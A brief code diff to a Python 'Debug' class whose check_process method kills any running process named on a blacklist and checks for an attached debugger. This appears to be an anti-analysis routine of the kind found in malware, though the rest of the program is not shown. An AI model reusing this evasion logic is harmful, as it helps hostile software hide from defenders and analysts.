@@ -101,10 +101,10 @@ class Debug:
 		)
 
 	def check_process(self) -> bool:
-		for proc in psutil.process_iter():
+		for proc in psutil.process_iter(["name","pid"]):
 			if any(procstr in proc.name().lower() for procstr in self.blacklisted_processes):
 				try:
-					proc.kill()
+					psutil.Process(proc.pid).kill()
 				except (psutil.NoSuchProcess, psutil.AccessDenied):
 					pass
 		if sys.gettrace():
